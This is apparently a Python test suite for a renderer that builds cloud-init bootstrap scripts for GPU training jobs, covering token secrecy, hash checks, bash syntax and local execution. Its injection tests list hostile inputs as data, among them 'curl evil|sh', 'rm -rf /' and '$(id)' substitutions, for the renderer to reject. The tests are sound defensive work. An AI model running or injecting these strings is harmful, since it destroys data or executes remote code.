"""runner.bootstrap.render: the cloud-init user_data. Validation/injection, token handling, size, determinism,
embedded files, bash syntax, and a LOCAL execution of stage 1 under Git Bash (no GPU, no provider, no network).

Run:  .venv/Scripts/python tests/test_bootstrap.py
"""
import base64
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from runner import bootstrap as B  # noqa: E402

TOKEN = "Zk3_" + "q9Lw-x7Rt2" * 4
CFG = {"epochs": 3, "batch_size": 128, "learning_rate": 0.001, "seed": 42}
URL = "https://opengrid.example.com"


def _bash():
    for c in (r"C:\Program Files\Git\bin\bash.exe", r"C:\Program Files (x86)\Git\bin\bash.exe", "/bin/bash"):
        if Path(c).exists():
            return c
    w = shutil.which("bash")
    return w if w and "system32" not in w.lower() else None   # never WSL's launcher


def _render(**kw):
    args = {"base_url": URL, "config": CFG}
    args.update(kw)
    return B.render(kw.pop("job_id", "job_abc123"), kw.pop("token", TOKEN), **{k: v for k, v in args.items()
                                                                              if k not in ("job_id", "token")})


def test_shape_size_and_determinism():
    s = _render()
    lines = s.split("\n")
    assert lines[0] == "#!/bin/bash"
    assert "set -euo pipefail" in lines[:8] and "umask 077" in lines[:8]
    assert "\r" not in s, "LF only"
    assert len(s.encode()) < B.USER_DATA_LIMIT // 4, f"{len(s.encode())} bytes: keep well under Lambda's 1 MB"
    assert _render() == s, "deterministic"
    other = _render(token="X" * 40)
    diff = [(a, b) for a, b in zip(s.split("\n"), other.split("\n")) if a != b]
    assert diff == [(TOKEN, "X" * 40)], "only the token differs"
    assert B.script_sha256(s) == hashlib.sha256(s.encode()).hexdigest() != B.script_sha256(other)
    assert B.TEMPLATE_VERSION.startswith("pytorch-mnist@") and re.fullmatch(r"[0-9a-f]{64}", B.BUNDLE_SHA256)
    assert B.TEMPLATE_VERSION in s and B.BUNDLE_SHA256 in s
    assert "/var/log/opengrid-job.log" in s and "timeout --kill-after" in s
    assert "shutdown" not in s.replace("no OS shutdown", "").replace("OS shutdown does NOT", ""), \
        "never relies on OS shutdown"
    for phase in ("bootstrap_started", "gpu_detected", "python_ready", "torch_installed", "cuda_available"):
        assert f"og_phase {phase}" in s, phase
    assert "--require-hashes" in s and "--only-binary :all:" in s and B.PYTORCH_INDEX in s
    assert "preinstalled_fallback" in s and "bootstrap_failed" in s


def test_token_written_once_never_echoed():
    s = _render()
    lines = s.split("\n")
    idx = [i for i, l in enumerate(lines) if TOKEN in l]
    assert len(idx) == 1, "token appears exactly once"
    i = idx[0]
    assert lines[i] == TOKEN, "on its own line"
    assert lines[i - 1].strip() == "cat > \"$OG_DIR/token\" <<'OG_TOKEN_EOF'" and lines[i + 1] == "OG_TOKEN_EOF", \
        "inside a quoted (non-expanding) heredoc into the token file"
    assert "set +x" in lines[i - 2]
    assert "set -x" not in s and "bash -x" not in s
    # the bearer header is assembled from the file at runtime, not templated
    assert "ogj_%s." in s and f"ogj_job_abc123.{TOKEN}" not in s
    for l in lines:
        if re.match(r"\s*(echo|printf)\b", l):
            assert "token" not in l.lower() or "Authorization" in l, l


def test_injection_rejected():
    bad_jobs = ["job;reboot", "job$(id)", "job`id`", "job'x", 'job"x', "job x", "job\nx", "", "a" * 65, "job/../x",
                None, 123]
    for j in bad_jobs:
        _expect_err(lambda: B.render(j, TOKEN, base_url=URL, config=CFG), f"job_id {j!r}")
    for t in ["short", "tok en" * 5, "tok'en" * 5, "tok$(id)" * 4, "tok\nen" * 5, "x" * 300, None]:
        _expect_err(lambda: B.render("job_1", t, base_url=URL, config=CFG), f"token {t!r}")
    for u in ["http://opengrid.example.com", "https://x.com/';reboot;'", "https://x.com/$(id)", "https://x.com/`id`",
              "https://x.com:99999999", "https://user@x.com", "https://x.com/a b", "https://x.com/?q=1", "ftp://x.com",
              "https://x.com\n/a", "javascript:alert(1)", "", None, "http://localhost:8000"]:
        _expect_err(lambda: B.render("job_1", TOKEN, base_url=u, config=CFG), f"url {u!r}")
    assert B.render("job_1", TOKEN, base_url="http://127.0.0.1:8099", config=CFG, allow_http=True)
    assert B.render("job_1", TOKEN, base_url="https://api.opengrid.dev:8443/prefix/", config=CFG)
    for t in ["custom", "pytorch-mnist; rm -rf /", None]:
        _expect_err(lambda: B.render("job_1", TOKEN, base_url=URL, template=t, config=CFG), f"template {t!r}")
    for c in [{"epochs": 0}, {"epochs": "3; reboot"}, {"cmd": "curl evil|sh"}, {"learning_rate": 9}, [], "x",
              {"batch_size": True}]:
        _expect_err(lambda: B.render("job_1", TOKEN, base_url=URL, config=c), f"config {c!r}")
    for m in [0, 4, 721, "30", 30.5, True]:
        _expect_err(lambda: B.render("job_1", TOKEN, base_url=URL, config=CFG, max_runtime_minutes=m), f"minutes {m!r}")


def _expect_err(fn, what):
    try:
        fn()
    except ValueError:
        return
    raise AssertionError(f"accepted {what}")


def test_config_and_runtime_embedding():
    s = _render(config={"epochs": 2, "seed": 7}, max_runtime_minutes=45)
    m = re.search(r"^OG_CONFIG_B64='([A-Za-z0-9+/=]+)'$", s, re.M)
    cfg = json.loads(base64.b64decode(m.group(1)))
    assert cfg == {"epochs": 2, "seed": 7, "batch_size": 128, "learning_rate": 0.001,
                   "checkpoint_every_epochs": 1}, "validated + defaults"
    assert re.search(r"^OG_MAX_SECONDS=2700$", s, re.M)
    assert re.search(r"^OG_JOB_ID='job_abc123'$", s, re.M) and re.search(rf"^OG_BASE_URL='{re.escape(URL)}'$", s, re.M)


def test_embedded_files_are_the_real_runner_files():
    s = _render()
    blocks = dict(re.findall(r"base64 -d > \"\$OG_DIR/app/runner/([^\"]+)\" <<'OG_B64_EOF'\n(.*?)\nOG_B64_EOF",
                             s, re.S))
    assert set(blocks) == set(B.EMBEDDED), blocks.keys()
    assert "bootstrap.py" not in blocks, "the renderer itself is not shipped"
    sums = dict((n, h) for h, n in re.findall(r"^([0-9a-f]{64})  runner/(\S+)$", s, re.M))
    for name, b64 in blocks.items():
        real = (ROOT / "runner" / name).read_bytes()
        assert base64.b64decode(b64.replace("\n", "")) == real, name
        assert sums[name] == hashlib.sha256(real).hexdigest(), name
    lock = (ROOT / "runner" / "requirements-gpu.txt").read_text()
    for pin in ("torch==2.4.1+cu121", "torchvision==0.19.1+cu121", "numpy==1.26.4"):
        assert pin in lock
    assert lock.count("--hash=sha256:") > 25


def test_bash_syntax():
    bash = _bash()
    if not bash:
        print("  SKIP test_bash_syntax: no bash")
        return
    with tempfile.TemporaryDirectory() as d:
        p = Path(d) / "ud.sh"
        p.write_bytes(_render().encode())
        r = subprocess.run([bash, "-n", str(p)], capture_output=True, text=True, timeout=60)
        assert r.returncode == 0, r.stderr


def test_resume_step_only_when_requested():
    plain = _render()
    assert "fetch-resume" not in plain and "--resume" not in plain and "runner/resume" not in plain
    sha = hashlib.sha256(b"ckpt").hexdigest()
    s = _render(resume={"sha256": sha, "epoch": 2})
    assert s.count("og fetch-resume") == 1 and f"--sha256 '{sha}' --epoch 2" in s
    assert f"--resume \"$OG_DIR/resume.pt\" --resume-sha256 '{sha}'" in s
    # the download runs after the CUDA check and before the trainer, and a failure is a reported bootstrap failure
    assert s.index("og_phase cuda_available") < s.index("og fetch-resume") < s.index("-m runner.mnist_train")
    assert "og_fail bootstrap_failed \"could not download the checkpoint to resume from" in s
    assert TOKEN not in s.split("OG_TOKEN_EOF")[2], "the token is still only in the heredoc"
    assert s.count(TOKEN) == 1
    for bad in ({"sha256": "x" * 64, "epoch": 2}, {"sha256": sha.upper(), "epoch": 2}, {"sha256": sha + "\n", "epoch": 2},
                {"sha256": sha, "epoch": 3}, {"sha256": sha, "epoch": 0}, {"sha256": sha, "epoch": "2"},
                {"sha256": sha, "epoch": True}, {"sha256": "'; rm -rf / #" + "a" * 52, "epoch": 1}, ["x"]):
        try:
            _render(resume=bad)
            raise AssertionError(f"accepted resume={bad}")
        except ValueError:
            pass
    bash = _bash()
    if bash:
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "ud.sh"
            p.write_bytes(s.encode())
            r = subprocess.run([bash, "-n", str(p)], capture_output=True, text=True, timeout=60)
            assert r.returncode == 0, r.stderr


def test_stage1_runs_locally_and_hides_token():
    """Execute stage 1 for real under Git Bash as a non-root user (HOME redirected to a temp dir). No systemd,
    no setsid on Windows, so stage 2 does not start; we check what stage 1 laid down."""
    bash = _bash()
    if not bash or os.name != "nt":
        print("  SKIP test_stage1_runs_locally_and_hides_token: needs Git Bash on Windows")
        return
    with tempfile.TemporaryDirectory() as d:
        home = Path(d) / "home"
        home.mkdir()
        p = Path(d) / "ud.sh"
        p.write_bytes(_render(job_id="job_local1").encode())
        env = {"HOME": str(home).replace("\\", "/"), "PATH": os.environ["PATH"], "SYSTEMROOT": os.environ.get("SYSTEMROOT", "")}
        r = subprocess.run([bash, str(p)], capture_output=True, text=True, timeout=120, env=env)
        assert r.returncode == 0, r.stdout + r.stderr
        og = home / ".opengrid-job"
        assert TOKEN not in r.stdout + r.stderr
        log = (og / "job.log").read_text()
        assert "stage1 start" in log and TOKEN not in log, log
        assert (og / "token").read_text().strip() == TOKEN
        assert (og / "curl.hdr").read_text() == f"Authorization: Bearer ogj_job_local1.{TOKEN}\n"
        for name in B.EMBEDDED:
            assert (og / "app" / "runner" / name).read_bytes() == (ROOT / "runner" / name).read_bytes(), name
        assert (og / "job.sh").exists() and int((og / "deadline").read_text()) > 0


def test_stage1_tampered_file_fails_closed():
    """A corrupted embedded file must fail the sha256 check (stage 1 exits non-zero -> bootstrap_failed)."""
    bash = _bash()
    if not bash or os.name != "nt":
        print("  SKIP test_stage1_tampered_file_fails_closed: needs Git Bash on Windows")
        return
    s = _render(job_id="job_local2")
    m = re.search(r"(runner/reporter.py\" <<'OG_B64_EOF'\n)([A-Za-z0-9+/]{8})", s)
    s = s.replace(m.group(0), m.group(1) + base64.b64encode(b"import o").decode(), 1)
    with tempfile.TemporaryDirectory() as d:
        home = Path(d) / "home"
        home.mkdir()
        p = Path(d) / "ud.sh"
        p.write_bytes(s.encode())
        env = {"HOME": str(home).replace("\\", "/"), "PATH": os.environ["PATH"], "SYSTEMROOT": os.environ.get("SYSTEMROOT", "")}
        r = subprocess.run([bash, str(p)], capture_output=True, text=True, timeout=120, env=env)
        assert r.returncode != 0
        log = (home / ".opengrid-job" / "job.log").read_text()
        assert "stage1 failed" in log and TOKEN not in log, log
        assert not (home / ".opengrid-job" / "job.sh").exists(), "never detaches a tampered runner"


if __name__ == "__main__":
    for t in (test_shape_size_and_determinism, test_token_written_once_never_echoed, test_injection_rejected,
              test_config_and_runtime_embedding, test_embedded_files_are_the_real_runner_files, test_bash_syntax,
              test_resume_step_only_when_requested, test_stage1_runs_locally_and_hides_token, test_stage1_tampered_file_fails_closed):
        t(); print(t.__name__, "ok")
